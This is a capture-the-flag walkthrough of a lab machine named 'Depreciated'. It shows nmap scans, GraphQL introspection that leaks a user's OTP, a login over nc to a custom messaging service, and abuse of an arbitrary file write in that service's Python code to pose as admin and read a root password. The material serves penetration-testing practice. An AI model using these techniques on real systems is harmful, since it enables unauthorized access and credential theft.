# Depreciated

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.170
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 11:50 +08
Nmap scan report for 192.168.157.170
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5132/tcp open  unknown
8433/tcp open  unknown
```

Did a detailed scan on the non SSH ports.

```
$ sudo nmap -p 80,5132,8433 -sC -sV --min-rate 3000 192.168.157.170 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 11:51 +08
Nmap scan report for 192.168.157.170
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Under Maintainence
5132/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
|     Enter Username:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Enter Username: Enter OTP: Incorrect username or password
|   Help: 
|     Enter Username: Enter OTP:
|   RPCCheck: 
|     Enter Username: Traceback (most recent call last):
|     File "/opt/depreciated/messaging/messages.py", line 100, in <module>
|     main()
|     File "/opt/depreciated/messaging/messages.py", line 82, in main
|     username = input("Enter Username: ")
|     File "/usr/lib/python3.8/codecs.py", line 322, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq: 
|     Enter Username: Traceback (most recent call last):
|     File "/opt/depreciated/messaging/messages.py", line 100, in <module>
|     main()
|     File "/opt/depreciated/messaging/messages.py", line 82, in main
|     username = input("Enter Username: ")
|     File "/usr/lib/python3.8/codecs.py", line 322, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie: 
|     Enter Username: Traceback (most recent call last):
|     File "/opt/depreciated/messaging/messages.py", line 100, in <module>
|     main()
|     File "/opt/depreciated/messaging/messages.py", line 82, in main
|     username = input("Enter Username: ")
|     File "/usr/lib/python3.8/codecs.py", line 322, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
8433/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
```

Port 5132 seems to have loads of errors, asking for a username and password.&#x20;

### Web Enum --> GraphQL Creds

Port 80 just shows this page:

<figure><img src="../../../.gitbook/assets/image (3142).png" alt=""><figcaption></figcaption></figure>

When we read the page source, we find this:

<figure><img src="../../../.gitbook/assets/image (2004).png" alt=""><figcaption></figcaption></figure>

There's a GraphQL instance on port 8433 that we can investigate. It also seems to be a login of some sort. We can first query all the different types being used:

```
{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```

Using this, we can find two interesting functions:

<figure><img src="../../../.gitbook/assets/image (3464).png" alt=""><figcaption></figcaption></figure>

The first one just gives us usernames:

```
$ curl --silent http://192.168.157.170:8433/graphql?query=%7BlistUsers%7D | jq
{
  "data": {
    "listUsers": "['peter', 'jason']"
  }
}
```

The second one takes a user as input. We can get a password for `peter` using this method:

<figure><img src="../../../.gitbook/assets/image (3730).png" alt=""><figcaption></figcaption></figure>

Using this, we can interact with the service on port 5132. The creds also don't work with SSH.

### SSH Creds

We can connect to port 5132 via `nc`:

```
$ nc -vn 192.168.157.170 5132                 
(UNKNOWN) [192.168.157.170] 5132 (?) open
Enter Username: peter
Enter OTP: CG5pzyISVOMvErUz
$ help

list    list messages
create  create new message
exit    exit the messaging system
read    read the message with given id
update  update the message with given id
help    Show this help 
```

We can find quite a few messages:

```
$ list
#2345           Improve the ticketing CLI syst
#1893           Staging keeps on crashing beca
#2347           [critical] The ticketing websi
#1277           Update the MySQL version, it's
#234            Hey, Please change your passwo
#0              Hey, Seriously this is getting
```

If we read 234, we find a password:

{% code overflow="wrap" %}
```
$ read 234
Message No: #234

Hey, Please change your password ASAP. You know the password policy, using weak password isn't allowed. And peter@safe is very weak, use https://password.kaspersky.com/ to check the strength of the password.

Attachment: none
```
{% endcode %}

We aren't allowed to read any message. Anyways, using this password we can `ssh` in:

<figure><img src="../../../.gitbook/assets/image (2773).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

I was still curious about the messaging thing and wanted to read the other messages, so I headed to `/opt/depreciated/messaging`, which was the directory revealed in our detailed `nmap` scan.

### Messages --> Root Creds

There are some files present here:

```
peter@depreciated:/opt/depreciated/messaging$ ls -la
total 20
drwxr-xr-x 2 root root 4096 May 28  2021 .
drwxr-xr-x 4 root root 4096 Nov 24  2021 ..
-rw-r--r-- 1 root root 3357 May 28  2021 messages.py
-rw------- 1 root root 1465 May 17  2021 msg.json
-rw------- 1 root root 1206 May 17  2021 msg.json.bak
```

Here's the Python script contents:

```python
import json
import os
import random
#TODO: Need to fix all the weird logics and bugs
try:
    with open("/opt/depreciated/messaging/msg.json", "r") as f:
        MESSAGES = json.load(f)
except json.decoder.JSONDecodeError:
    with open("/opt/depreciated/messaging/msg.json.bak", "r") as f:
        MESSAGES = json.load(f)

def create_message(user):
    for_ = input("for: ")
    description = input("Description: ")
    num = random.randint(1000, 9999)
    author = user
    attachment = input("File: ")

    if attachment and attachment != "none" and os.path.exists(attachment):
        with open(attachment, 'r') as f:
            data = f.read()
        basename = '/opt/depreciated/' + os.path.basename(attachment)

        with open(basename, 'w') as f:
            f.write(data)
    else:
        attachment = "none"
    msg_info = {'id': num, 'author': author, 'description': description, 'for': for_, 'attachment': attachment}
    MESSAGES.append(msg_info)

    with open("/opt/depreciated/messaging/msg.json", 'w') as f:
         json.dump(MESSAGES, f)


def terminal(user):
    """This will provide the attacker a shell via 
       which they can run/execute custom commands
    """

        
    while True:
        cmd = input("$ ")
        if cmd.lower() == "help" or cmd.lower() == "?":
            print("""
            list    list messages
            create  create new message
            exit    exit the messaging system
            read    read the message with given id
            update  update the message with given id
            help    Show this help
                    """)
        elif cmd.lower() == "exit":
            exit(1)
        elif cmd.lower() == "list":
            for message in MESSAGES:
                print(f'#{message["id"]}\t\t{message["description"][:30]}')
        elif cmd.lower() == "create":
            create_message(user)
        elif "read" in cmd.lower():
            try:
                _, message_id = cmd.lower().split()
            except ValueError:
                print("Please provide a valid message id")
                continue
            try:
                for message in MESSAGES:
                    if message["id"] == int(message_id) and (user == message["author"] or user in message["for"] or user == "admin"):
                        if "attachment" in message:
                            attach = message['attachment']
                        else:
                            attach = "none"
                        print(f'Message No: #{message["id"]}\n\n{message["description"]}\n\nAttachment: {attach}')
                        break
                else:
                   print("Not authorized to read")
            except ValueError:
                print('Problem reading the message, make sure you enter the correct message id')
        elif "update" in cmd.lower():
            print("This is a WIP feature")
def main():
    username = input("Enter Username: ")
    OTP = input("Enter OTP: ")

    with open("/opt/depreciated/code.txt", "r") as f:
        data = f.readline()
    try:
        name,password = data.split(":")
    except ValueError:
        print("Incorrect username or password")
        exit(1)

    if (username.strip() == name.strip()) and (OTP.strip() == password.strip()):
        terminal(name)
    else:
        print("Incorrect username or password")
        exit(1)

if __name__ == '__main__':
    main()
```

It seems that `code.txt` is read and this is the username and password checked, and within the `terminal` function, there's also a check for whether the username is called `admin`. Lastly, the username and password are stored within `/opt/depreciated/code.txt`.

The `create_message` function gives us an arbitrary write using the attachment function. We can overwrite the original `code.txt` with a new one as the `admin` user:

```bash
echo 'admin:password' > /tmp/code.txt

## on port 5132
$ create
for: admin
Description: lol
File: /tmp/code.txt

peter@depreciated:/opt/depreciated$ cat code.txt 
admin:password
```

This would allow us to read message 0:

{% code overflow="wrap" %}
```
$ read 0
Message No: #0

Hey, Seriously this is getting out of hand. Your new password is 9>XsS+&=Zn#AS9-@ Please don't forget your password this time. And make sure to change this once you are in.

Attachment: none
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2776).png" alt=""><figcaption></figcaption></figure>
